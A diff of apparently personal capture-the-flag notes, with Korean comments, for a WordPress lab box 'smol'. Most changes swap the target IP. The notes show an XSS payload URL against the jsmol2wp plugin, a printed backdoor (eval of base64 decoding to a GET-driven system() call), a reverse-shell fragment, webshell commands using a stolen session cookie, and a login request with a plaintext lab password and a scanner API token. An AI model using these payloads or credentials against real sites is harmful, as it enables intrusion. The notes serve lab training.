@@ -1,10 +1,10 @@
-# IP: 10.10.52.253
+# IP: 10.10.97.230
 
 # nmap -> 22, 80
 
 http://www.smol.thm
 
-Nmap scan report for 10.10.52.253
+Nmap scan report for 10.10.97.230
 Host is up (0.29s latency).
 Not shown: 995 closed tcp ports (reset), 3 filtered tcp ports (no-response)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
@@ -95,7 +95,7 @@ wpscan --url http://www.smol.thm --api-token UkGyliOCsyQuHgPPpEip3b6wkbP5rAV2Xae
 
 ---
 
-[+] URL: http://www.smol.thm/ [10.10.52.253]
+[+] URL: http://www.smol.thm/ [10.10.97.230]
 [+] Started: Thu Jul 24 15:03:12 2025
 
 Interesting Finding(s):
@@ -209,7 +209,7 @@ Checking Config Backups - Time: 00:00:11 <======================================
 
 # 취약점 그대로 악용하기 -> 사이트 웹 브라우저에 접속
 
-# IP: 10.10.52.253, www.smol.thm -> CVE 취약점 확인
+# IP: 10.10.97.230, www.smol.thm -> CVE 취약점 확인
 
 http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8
 
@@ -381,7 +381,7 @@ http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=g
 
 # 플러그인 파일 구조 (php)
 
-# IP: 10.10.52.253
+# IP: 10.10.97.230
 
 # 취약한 코드 및 base64 텍스트 발견 -> eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
 
@@ -496,7 +496,7 @@ add_action( 'admin_head', 'dolly_css' );
 
 # base64 decode
 
-# IP: 10.10.52.253
+# IP: 10.10.97.230
 
 echo -n "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | tr -d '=' | base64 -d
 
@@ -548,3 +548,33 @@ bash: dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW
 # 아까 탈취했던 쿠키 활용
 
 curl -L -H "Cookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_45a7e4c82b517c5af328feabce4d0187=wpuser%7C1753668949%7CcPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv%7Cccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070" -H "User-Agent: Mozilla/5.0" http://www.smol.thm/wp-admin/profile.php?cmd=ls | bat -l html
+
+# 중간에 쉬다와서 다시 쿠키 탈취 필요
+
+# IP: 10.10.97.230
+
+POST /wp-login.php HTTP/1.1
+Host: www.smol.thm
+Content-Length: 168
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://www.smol.thm
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10*15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/\_;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://www.smol.thm/wp-login.php?redirect_to=http%3A%2F%2Fwww.smol.thm%2Findex.php%2F2023%2F08%2F16%2Frce%2F
+Accept-Encoding: gzip, deflate, br
+Cookie: wordpress_test_cookie=WP%20Cookie%20check
+Connection: keep-alive
+
+log=wpuser&pwd=kbLSF2Vop%23lw3rjDZ629\*Z%25G&rememberme=forever&wp-submit=Log+In&redirect_to=http%3A%2F%2Fwww.smol.thm%2Findex.php%2F2023%2F08%2F16%2Frce%2F&testcookie=1
+
+# login -> gui 불편하니까 cli 환경으로 전환
+
+curl -i -X POST "http://www.smol.thm/wp-login.php" -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0" --data "log=wpuser&pwd=kbLSF2Vop%23lw3rjDZ629\*Z%25G&rememberme=forever&wp-submit=Log+In&redirect_to=http://www.smol.thm/wp-admin/" -c cookie.txt
+
+┌──(root㉿docker-desktop)-[/]
+└─# curl -b cookie.txt -L http://www.smol.thm/wp-admin
+
+# 이제 RCE 취약점이 있는 위치 탐색하기
